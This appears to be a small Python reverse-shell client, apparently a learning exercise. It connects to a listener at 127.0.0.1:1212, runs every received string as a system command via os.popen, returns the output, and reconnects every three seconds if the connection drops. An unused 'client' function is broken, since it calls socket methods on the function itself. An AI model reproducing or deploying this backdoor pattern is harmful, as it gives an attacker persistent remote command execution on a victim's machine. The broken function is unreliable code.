import os
from socket import *
import time




def client(port):
    while True:
        msg =input("Message >>>")
        client.sendall(msg.encode())
        rec = client.recv(2048).decode()
        print(rec)
        if  msg == "au revoir":
            client.close()
            break

def client2(port):
    sock = socket(AF_INET, SOCK_STREAM)
    sock.connect(("127.0.0.1", port))
    while True:
        data = sock.recv(2048).decode()
        if data == "sair":
            sock.close()
            break

        result = os.popen(data).read()
        sock.sendall(result.encode())


while True:
    try:
        client2(1212)
    except Exception as e:
        print(str(e))
        time.sleep(3)
        print("------retrying to connect------")
        continue